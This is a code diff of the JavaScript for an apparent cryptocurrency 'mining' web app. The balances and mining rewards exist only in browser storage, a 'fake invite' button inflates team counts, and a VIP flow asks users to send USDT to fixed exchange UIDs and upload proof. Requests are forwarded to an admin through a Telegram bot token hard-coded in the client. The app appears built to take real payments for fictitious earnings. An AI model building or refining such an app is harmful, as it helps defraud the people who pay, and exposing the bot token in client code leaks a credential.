@@ -1,28 +1,41 @@
-/* ============================
-   script.js — FINAL with your token (browser)
-   - Uses your provided TELEGRAM_BOT_TOKEN & ADMIN_CHAT_ID
+/* ============================================
+   script.js — FULL MANUAL VERSION
    - Persistent localStorage state
-   - Mining animation + progress
-   - Convert / Withdraw / VIP flows with Telegram notify
-   ============================ */
+   - Mining animation + persistent timer + collect
+   - Convert TRX -> USDT (rate = 0.0006)
+   - Withdraw (Bitget / Bybit) with min 0.01
+   - VIP buy flow (VIP1 & VIP2) with proof (base64 stored)
+   - Team: referral code only (copy) + fake invite increment
+   - Telegram notifications using token & chat id provided
+   ============================================ */
 
-/* ====== TELEGRAM CONFIG (your provided token & chat id) ====== */
-const TELEGRAM_BOT_TOKEN = "7659505060:AAFmwIDn2OgrtNoemPpmBWaxsIfdsQdZGCI"; // your token (as requested)
-const ADMIN_CHAT_ID = "7417215529";
+/* ========== TELEGRAM CONFIG (USER PROVIDED TOKEN) ========== */
+/* As you requested, using the token/id you gave earlier */
+const TELEGRAM_BOT_TOKEN = "7659505060:AAFmwIDn2OgrtNoemPpmBWaxsIfdsQdZGCI"; // your token (manual)
+const ADMIN_CHAT_ID = "7417215529"; // admin/chat id
 
-/* ======= CONSTANTS ======= */
-const STORAGE_KEY = "trx_final_v1";
-const TRX_PRICE_USDT = 0.0006;
+/* ========== CONSTANTS ========== */
+const STORAGE_KEY = "trx_manual_full_v1";
+const TRX_PRICE_USDT = 0.0006; // 1 TRX price (your requirement)
 const REWARD_TRX = 5;
 const MINING_DURATION_MS = 2 * 60 * 60 * 1000; // 2 hours
 
-/* ======= Storage helpers ======= */
-function loadState(){ try{ const j = localStorage.getItem(STORAGE_KEY); return j?JSON.parse(j):null }catch(e){return null} }
-function saveState(s){ localStorage.setItem(STORAGE_KEY, JSON.stringify(s)); }
+/* ========== localStorage helpers ========== */
+function loadState() {
+  try {
+    const raw = localStorage.getItem(STORAGE_KEY);
+    return raw ? JSON.parse(raw) : null;
+  } catch (e) { return null; }
+}
+function saveState(st) {
+  try {
+    localStorage.setItem(STORAGE_KEY, JSON.stringify(st));
+  } catch (e) { console.error('saveState err', e); }
+}
 
-/* ======= Initial state ======= */
+/* ========== initial state ========== */
 let state = loadState() || {
-  trx: 20,
+  trx: 20, // starting
   usdt: parseFloat((20 * TRX_PRICE_USDT).toFixed(6)),
   teamCount: 0,
   miningActive: false,
@@ -35,7 +48,7 @@ let state = loadState() || {
 };
 saveState(state);
 
-/* ======= DOM refs ======= */
+/* ========== DOM references ========== */
 const navBtns = Array.from(document.querySelectorAll('.nav-btn'));
 const pages = Array.from(document.querySelectorAll('.page'));
 const refCodeEl = document.getElementById('refCode');
@@ -80,31 +93,36 @@ const bybitUIDEl = document.getElementById('bybitUID');
 if(bitgetUIDEl) bitgetUIDEl.innerText = "9879164714";
 if(bybitUIDEl) bybitUIDEl.innerText = "269645993";
 
-/* ======= Navigation: show/hide pages ======= */
+/* ========== Navigation: keep pages separate ========== */
 navBtns.forEach(btn=>{
   btn.addEventListener('click', ()=>{
     navBtns.forEach(b=>b.classList.remove('active'));
     btn.classList.add('active');
     const target = btn.dataset.target;
     pages.forEach(p=>p.classList.remove('active'));
-    const el = document.getElementById(`page-${target}`) || document.getElementById(target);
+    // always expect id = page-<name>
+    const el = document.getElementById(target) || document.getElementById(`page-${target}`);
     if(el) el.classList.add('active');
   });
 });
 
-/* ======= Referral display & copy ======= */
+/* ========== Referral display & copy ========= */
 refCodeEl.innerText = state.refCode;
-refInput && (refInput.value = state.refCode);
-copyRefBtn && copyRefBtn.addEventListener('click', ()=> navigator.clipboard.writeText(state.refCode).then(()=> alert('Referral code copied')));
-copyRefBtn2 && copyRefBtn2.addEventListener('click', ()=> navigator.clipboard.writeText(state.refCode).then(()=> alert('Referral code copied')));
+if(refInput) refInput.value = state.refCode;
+copyRefBtn && copyRefBtn.addEventListener('click', ()=> {
+  navigator.clipboard.writeText(state.refCode).then(()=> alert('Referral code copied'));
+});
+copyRefBtn2 && copyRefBtn2.addEventListener('click', ()=> {
+  navigator.clipboard.writeText(state.refCode).then(()=> alert('Referral code copied'));
+});
 
-/* ======= Render ======= */
+/* ========== Render UI ========= */
 let miningInterval = null;
 function renderAll(){
-  trxAmountEl && (trxAmountEl.innerText = parseFloat(state.trx).toFixed(6));
-  usdtAmountEl && (usdtAmountEl.innerText = parseFloat(state.usdt).toFixed(6) + ' USDT');
-  teamCountEl && (teamCountEl.innerText = state.teamCount);
-  priceLabel && (priceLabel.innerText = TRX_PRICE_USDT.toString());
+  if(trxAmountEl) trxAmountEl.innerText = parseFloat(state.trx).toFixed(6);
+  if(usdtAmountEl) usdtAmountEl.innerText = parseFloat(state.usdt).toFixed(6) + ' USDT';
+  if(teamCountEl) teamCountEl.innerText = state.teamCount;
+  if(priceLabel) priceLabel.innerText = TRX_PRICE_USDT.toString();
   renderHistory();
   renderMiningUI();
   saveState(state);
@@ -119,7 +137,7 @@ function renderHistory(){
   });
 }
 
-/* ======= Mining UI & logic (persistent) ======= */
+/* ========== Mining logic (persistent) ========== */
 function renderMiningUI(){
   if(state.miningActive && state.miningEnd){
     const remaining = Math.max(0, state.miningEnd - Date.now());
@@ -184,9 +202,11 @@ function collectReward(){
   renderAll();
 }
 
-/* helper format */
+/* helper: format seconds -> HH:MM:SS */
 function formatSecondsToHMS(sec){
-  const h = Math.floor(sec/3600), m = Math.floor((sec%3600)/60), s = sec%60;
+  const h = Math.floor(sec/3600);
+  const m = Math.floor((sec%3600)/60);
+  const s = sec%60;
   return `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
 }
 
@@ -197,7 +217,7 @@ function toggleCoinSpin(on){
   if(on) coin.classList.add('spin-active'); else coin.classList.remove('spin-active');
 }
 
-/* ======= Convert ======= */
+/* ========== Convert TRX -> USDT (Me) ========== */
 convertDo && convertDo.addEventListener('click', ()=>{
   const v = parseFloat(convertInput.value || 0);
   if(!v || v <= 0){ alert('Enter TRX amount'); return; }
@@ -213,7 +233,7 @@ convertDo && convertDo.addEventListener('click', ()=>{
   renderAll();
 });
 
-/* ======= Withdraw ======= */
+/* ========== Withdraw (Me) ========== */
 submitWithdraw && submitWithdraw.addEventListener('click', ()=>{
   const method = withdrawMethod.value;
   const uid = withdrawUID.value.trim();
@@ -231,24 +251,26 @@ submitWithdraw && submitWithdraw.addEventListener('click', ()=>{
   renderAll();
 });
 
-/* ======= Team helpers ======= */
+/* ========== Team helpers (only code) ========== */
 document.getElementById('fakeInviteBtn')?.addEventListener('click', ()=>{
   state.teamCount = (parseInt(state.teamCount) || 0) + 1;
   saveState(state);
   renderAll();
 });
 
-/* ======= VIP flow ======= */
+/* ========== VIP flow ========== */
 let selectedVipPlan = null;
 buyVipBtns.forEach(b=>{
   b.addEventListener('click', ()=>{
     selectedVipPlan = b.closest('.vip-card').dataset.plan;
     vipForm.classList.remove('hidden');
     vipFormTitle.innerText = (selectedVipPlan === 'vip1' ? 'VIP 1 — 0.10 USDT' : 'VIP 2 — 0.20 USDT');
-    vipMsg.innerText = `Send ${selectedVipPlan==='vip1'? '0.10' : '0.20'} USDT to Bitget (9879164714) or Bybit (269645993), upload proof and submit.`;
+    vipMsg.innerText = `Send ${selectedVipPlan === 'vip1' ? '0.10' : '0.20'} USDT to Bitget (9879164714) or Bybit (269645993) and upload proof.`;
   });
 });
-vipCancel && vipCancel.addEventListener('click', ()=>{ selectedVipPlan = null; vipForm.classList.add('hidden'); vipMsg.innerText = ''; });
+vipCancel && vipCancel.addEventListener('click', ()=>{
+  selectedVipPlan = null; vipForm.classList.add('hidden'); vipMsg.innerText = '';
+});
 vipSubmit && vipSubmit.addEventListener('click', ()=>{
   const exch = vipExchange.value;
   const sender = vipSenderUID.value.trim();
@@ -260,6 +282,7 @@ vipSubmit && vipSubmit.addEventListener('click', ()=>{
   const req = { plan:selectedVipPlan, ref: state.refCode, exchange: exch, sender, memo, time: Date.now() };
   state.vipRequests.push(req);
   vipMsg.innerText = 'VIP request submitted — admin will review within 24h.';
+  // save optional proof as base64 (local only)
   if(file){
     const reader = new FileReader();
     reader.onload = e => { state[`vip_proof_${Date.now()}`] = e.target.result; saveState(state); };
@@ -267,31 +290,29 @@ vipSubmit && vipSubmit.addEventListener('click', ()=>{
   }
   sendTelegramMessage(`[VIP REQUEST] Plan:${selectedVipPlan} Ref:${state.refCode} Exchange:${exch} Sender:${sender} Memo:${memo}`);
   saveState(state);
-  selectedVipPlan = null;
-  vipForm.classList.add('hidden');
+  vipForm.classList.add('hidden'); selectedVipPlan = null;
   renderAll();
 });
 
-/* ======= Telegram helper (safe, reports success/error to UI console) ======= */
+/* ========== Telegram helper ========== */
+/* Note: browsers can block cross-origin requests to Telegram (CORS). If telegram doesn't deliver,
+   check console for CORS error. Server/proxy recommended for production.
+*/
 function sendTelegramMessage(text){
-  // If token/chats are empty, just log and return
   if(!TELEGRAM_BOT_TOKEN || !ADMIN_CHAT_ID){
     console.log('Telegram disabled ->', text);
     return;
   }
-
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
   fetch(url, {
     method: 'POST',
     headers: {'Content-Type':'application/json'},
     body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text, parse_mode: 'HTML' })
   }).then(r=>r.json()).then(res=>{
-    // Telegram returns ok:true on success; show quick UI toast in mineMessage (non-blocking)
     console.log('tg res', res);
     if(res && res.ok){
-      // small non-intrusive UI feedback
       const prev = mineMessage.innerText;
-      mineMessage.innerText = 'Notification sent to Telegram (admin).';
+      mineMessage.innerText = 'Notification sent to Telegram.';
       setTimeout(()=> { mineMessage.innerText = prev; }, 2500);
     } else {
       console.warn('tg error', res);
@@ -300,28 +321,26 @@ function sendTelegramMessage(text){
     }
   }).catch(err=>{
     console.error('tg fetch err', err);
-    mineMessage.innerText = 'Telegram: network error (check console).';
-    setTimeout(()=> { mineMessage.innerText = ''; }, 3000);
+    mineMessage.innerText = 'Telegram: network/CORS error (see console).';
+    setTimeout(()=> { mineMessage.innerText = ''; }, 3500);
   });
 }
 
-/* ======= Add spin CSS runtime for coin ======= */
+/* ========== Add spin CSS for coin (runtime) ========== */
 (function addSpinCSS(){
   const css = `.coin-outer.spin-active{animation: spinCoin 3s linear infinite;box-shadow:0 20px 60px rgba(0,255,150,0.06);} @keyframes spinCoin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}`;
   const s = document.createElement('style'); s.innerText = css; document.head.appendChild(s);
 })();
 
-/* ======= Init ======= */
+/* ========== Init: resume mining if active and render ========== */
 (function init(){
-  // numeric sanity
   state.trx = parseFloat(state.trx);
   state.usdt = parseFloat(state.usdt);
-  // resume mining if needed
   if(state.miningActive && state.miningEnd && Date.now() < state.miningEnd){
-    // continue mining
+    // mining continues automatically via renderMiningUI interval
   } else {
     if(state.miningEnd && Date.now() >= state.miningEnd){
-      // expired but not claimed -> keep as ready to claim (user must collect)
+      // mining expired but not claimed -> user must collect; keep miningActive false
       state.miningActive = false;
       state.miningEnd = null;
     }
